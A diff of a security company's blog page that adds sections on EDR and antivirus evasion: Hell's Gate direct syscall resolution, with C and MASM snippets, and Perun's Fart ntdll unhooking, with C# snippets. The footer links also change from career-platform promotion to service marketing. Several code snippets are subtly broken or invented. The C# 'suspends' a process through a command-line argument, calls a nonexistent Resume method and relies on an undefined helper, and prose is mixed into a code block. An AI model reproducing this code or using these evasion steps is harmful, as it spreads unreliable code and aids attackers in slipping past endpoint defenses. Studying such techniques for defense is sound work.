-<p class="wp-block-paragraph"><strong><em>Analysis of Effectiveness:</em></strong> These examples and case studies demonstrate how ROP can be employed to bypass security mechanisms such as DEP and ASLR. By leveraging existing code snippets within the binary, attackers can craft sophisticated exploits that evade traditional defenses.</p>
 
 
+<p class="wp-block-paragraph">In the ever-evolving world of cybersecurity, the ability to dynamically resolve system calls is a significant advantage for evading detection mechanisms. The paper titled &#8220;Hell’s Gate&#8221; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec) presents a novel approach to this challenge, offering a method to dynamically retrieve syscalls without relying on static elements.</p>
 
-<h4 class="wp-block-heading">Advanced ROP</h4>
 
 
+<p class="wp-block-paragraph">Historical Context</p>
 
-<p class="wp-block-paragraph">One notable example is the &#8220;Spectre&#8221; vulnerability disclosed in 2018. While primarily related to speculative execution in CPUs, some attacks demonstrated ROP techniques to extract sensitive information from memory, effectively bypassing security measures like address space layout randomization (ASLR) and data execution prevention (DEP).</p>
 
 
+<p class="wp-block-paragraph">Historically, evasion techniques focused on nullifying the Import Address Table (IAT) of the PE file by recreating functions like LoadLibrary, GetProcAddress, and FreeLibrary. This approach was popularized in 1997 when Jack Qwerty introduced a utility that parsed the in-memory module Kernel32.dll&#8217;s Export Address Table (EAT) to resolve function addresses dynamically.</p>
 
-<p class="wp-block-paragraph">Additionally, the &#8220;CVE-2021-1732&#8221; vulnerability in Windows highlighted ROP&#8217;s effectiveness in privilege escalation. Attackers were able to construct ROP chains that exploited the vulnerability, allowing them to execute arbitrary code in kernel mode, illustrating the technique&#8217;s potency even against hardened operating systems.</p>
 
 
+<p class="wp-block-paragraph">However, with the rise of Red Team tactics, there has been a shift towards using syscalls for evasion. Syscalls offer two main advantages:</p>
 
-<h3 class="wp-block-heading">Security Researcher</h3>
 
 
+<p class="wp-block-paragraph">They eliminate the need for an in-memory module to be linked, ensuring position independence.</p>
 
-<p class="wp-block-paragraph"><a href="https://www.linkedin.com/in/ACoAACMUPk8BjjkCwMk2KYJZ3WNyiTYgjXAzmgk">Amirhossein Gholizadeh</a>,&nbsp;<a href="https://www.linkedin.com/in/ACoAADZqFYEBRzUOWIJMQWUgqHHfNHf0tydlb4U">Surya Dev Singh</a></p>
 
 
+<p class="wp-block-paragraph">They bypass potential hooks set by EDR or AV products.</p>
 
-<p class="wp-block-paragraph">Cover by <strong>@mercuriorojo</strong></p>
+
+
+<p class="wp-block-paragraph">Hell’s Gate: The New Approach</p>
+
+
+
+<p class="wp-block-paragraph">Hell’s Gate introduces a method to dynamically retrieve syscalls without relying on static elements. The technique leverages the fact that almost every PE image loaded into memory implicitly links against NTDLL.dll. This DLL contains the image loader functionality and is crucial for transitioning from user mode API invocations into kernel memory address space via syscalls.</p>
+
+
+
+<p class="wp-block-paragraph">Commands and Codes</p>
+
+
+
+<p class="wp-block-paragraph">To achieve dynamic system call resolution, the following steps are taken:</p>
+
+
+
+<p class="wp-block-paragraph">Retrieve the Process Environment Block (PEB) of the process.</p>
+
+
+
+<p class="wp-block-paragraph">PPEB Peb = (PPEB)__readgsqword(0x60); //64bit process</p>
+
+
+
+<p class="wp-block-paragraph">Traverse the PEB to access the LoaderData member, which contains a list of in-memory modules.</p>
+
+
+
+<pre class="wp-block-code"><code>PLDR_MODULE pLoadModule;
+
+pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 16);
+
+Access the base address of the in-memory module (typically NTDLL.dll).
+
+PBYTE ImageBase;
+
+ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;
+
+Traverse the module's Export Address Table to locate the functions and their associated syscalls.
+
+PIMAGE_DOS_HEADER Dos = NULL;
+
+Dos = (PIMAGE_DOS_HEADER)ImageBase;
+
+Execute System Calls: Functions within NTDLL.dll typically move the system call into the EAX register and then check the current thread execution environment. If it's determined to be x64 based, the system call is executed; otherwise, the function returns.
+
+The Hell’s Gate technique introduces two methods:
+
+HellsGate: Modifies the syscall that will be executed.
+
+.data
+
+wSystemCall DWORD 000h
+
+.code
+
+HellsGate PROC
+
+mov wSystemCall, 000h
+
+mov wSystemCall, ecx
+
+ret
+
+HellsGate ENDP
+
+HellDescent: Executes the system call.
+
+HellDescent PROC
+
+mov r10, rcx
+
+mov eax, wSystemCall
+
+syscall
+
+ret
+
+HellDescent ENDP
+
+End</code></pre>
+
+
+
+<p class="wp-block-paragraph">Using these methods, one can dynamically set and execute syscalls, providing a powerful tool for evasion.</p>
+
+
+
+<h2 class="wp-block-heading" id="h-perun-s-fart">Perun&#8217;s fart</h2>
+
+
+
+<p class="wp-block-paragraph">API hooks have long been the cornerstone of internal process monitoring, especially for Anti-Virus (AV) and Endpoint Detection and Response (EDR) solutions. Their popularity stems from their simplicity and the necessity imposed by Kernel Patch Protection (KPP). However, as with any security measure, adversaries continually seek ways to bypass or neutralize them.</p>
+
+
+
+<p class="wp-block-paragraph">1. The Evolution of Bypass Techniques</p>
+
+
+
+<p class="wp-block-paragraph">Over the years, malware developers and security researchers have devised numerous methods to bypass or entirely remove these hooks. Comprehensive reviews of these techniques have been documented in various resources, providing insights into the cat-and-mouse game between attackers and defenders.</p>
+
+
+
+<p class="wp-block-paragraph">Recently, Yarhen Shafir introduced a new method of undetectable code injection, leveraging new system calls:</p>
+
+
+
+<p class="wp-block-paragraph">NtCreateThreadStateChange / NtCreateProcessStateChange</p>
+
+
+
+<p class="wp-block-paragraph">NtChangeThreadState / NtChangeProcessState</p>
+
+
+
+<p class="wp-block-paragraph">However, the defense community is not one to rest on its laurels. Articles detailing methods to detect malicious activities, especially those attempting to bypass hooks and execute direct syscalls, have emerged. These discussions set the stage for the development of innovative techniques, such as syscall unhooking.</p>
+
+
+
+<p class="wp-block-paragraph">2. Introduction to Perun&#8217;s Fart</p>
+
+
+
+<p class="wp-block-paragraph">Perun&#8217;s Fart is not a groundbreaking revelation in the realm of bypass techniques. Instead, it offers a method to locate a pristine, unhooked copy of ntdll without resorting to disk reads. The underlying concept is straightforward:</p>
+
+
+
+<p class="wp-block-paragraph">Obtain a copy of ntdll from a newly spawned process before AV/EDR solutions apply their hooks.</p>
+
+
+
+<p class="wp-block-paragraph">There exists a brief window between the instantiation of a new process and the moment AV/EDR tools inject their hooks via a DLL. This interval might be fleeting, raising the question: Is it feasible to consistently outpace this race condition?</p>
+
+
+
+<p class="wp-block-paragraph">The answer is a resounding yes, and the method is surprisingly simple.</p>
+
+
+
+<p class="wp-block-paragraph">3. Bypassing the Hooks</p>
+
+
+
+<p class="wp-block-paragraph">The technique involves the following steps:</p>
+
+
+
+<p class="wp-block-paragraph">Spawn a New Process in Suspended State:</p>
+
+
+
+<p class="wp-block-paragraph">This ensures that the process remains inactive, preventing any hooks from being applied immediately.</p>
+
+
+
+<pre class="wp-block-code"><code>ProcessStartInfo psi = new ProcessStartInfo("targetProcess.exe");
+
+psi.CreateNoWindow = true;
+
+psi.UseShellExecute = false;
+
+psi.RedirectStandardOutput = true;
+
+psi.WindowStyle = ProcessWindowStyle.Hidden;
+
+psi.Arguments = "/startSuspended";
+
+Process process = Process.Start(psi);</code></pre>
+
+
+
+<p class="wp-block-paragraph">Copy the Clean ntdll:</p>
+
+
+
+<p class="wp-block-paragraph">Once the new process is in a suspended state, copy the unhooked ntdll into the original process.</p>
+
+
+
+<p class="wp-block-paragraph">IntPtr ntdllAddress = ProcessMemoryReader.GetModuleAddress(process.Id, &#8220;ntdll.dll&#8221;);</p>
+
+
+
+<p class="wp-block-paragraph">byte[] ntdllBytes = ProcessMemoryReader.ReadProcessMemory(process.Handle, ntdllAddress, ntdllSize);</p>
+
+
+
+<p class="wp-block-paragraph">Resume Original Process Execution:</p>
+
+
+
+<p class="wp-block-paragraph">With the clean ntdll in place, the original process can continue its operations, bypassing any hooks that would have been set by AV/EDR solutions.</p>
+
+
+
+<p class="wp-block-paragraph">process.Resume();</p>
+
+
+
+<p class="wp-block-paragraph">Peruns-Fart is named after the Slavic god of thunder, Perun. The project appears to be related to some form of native interoperation in C#.</p>
+
+
+
+<p class="wp-block-paragraph">2. Repository Structure</p>
+
+
+
+<p class="wp-block-paragraph">The repository primarily consists of C# files, with the main code residing in the peruns-fart directory. Key files include:</p>
+
+
+
+<p class="wp-block-paragraph">Native.cs: Contains native method signatures and related functionalities.</p>
+
+
+
+<p class="wp-block-paragraph">Program.cs: The main entry point of the application.</p>
+
+
+
+<p class="wp-block-paragraph">3. Key Code Snippets</p>
+
+
+
+<p class="wp-block-paragraph">3.1 Native Interoperation in Native.cs</p>
+
+
+
+<p class="wp-block-paragraph">The Native.cs file contains P/Invoke signatures for native methods. Here&#8217;s a snippet from the file:</p>
+
+
+
+<pre class="wp-block-code"><code>using System;
+
+using System.Runtime.InteropServices;
+
+public static class Native
+
+{
+
+&nbsp;&nbsp;&nbsp;&nbsp;&#91;DllImport("kernel32.dll", SetLastError = true)]
+
+&nbsp;&nbsp;&nbsp;&nbsp;public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+&nbsp;&nbsp;&nbsp;&nbsp;// ... other native method signatures ...
+
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">This code demonstrates how to declare native methods in C# using the DllImport attribute. The above method, VirtualAlloc, is a Windows API function used for memory allocation.</p>
+
+
+
+<p class="wp-block-paragraph">3.2 Main Program in Program.cs</p>
+
+
+
+<p class="wp-block-paragraph">The Program.cs file contains the main logic of the application. Here&#8217;s a brief snippet:</p>
+
+
+
+<pre class="wp-block-code"><code>using System;
+
+namespace peruns_fart
+
+{
+
+&nbsp;&nbsp;&nbsp;&nbsp;class Program
+
+&nbsp;&nbsp;&nbsp;&nbsp;{
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;static void Main(string&#91;] args)
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// ... main logic of the application ...
+
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+
+&nbsp;&nbsp;&nbsp;&nbsp;}
+
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph">This is the entry point of the application, where the main logic is executed.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Security Researchers</strong></p>
+
+
+
+<p class="wp-block-paragraph">Amir Gholizadeh (@arimaqz)</p>
+
+
+
+<p class="wp-block-paragraph"><a href="https://www.linkedin.com/in/ACoAADZqFYEBRzUOWIJMQWUgqHHfNHf0tydlb4U" target="_blank" rel="noreferrer noopener">Surya Dev Singh </a>(@kryolite_secure)</p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -3014,27 +3554,27 @@ call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel fun
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -3157,11 +3697,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -3184,59 +3724,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
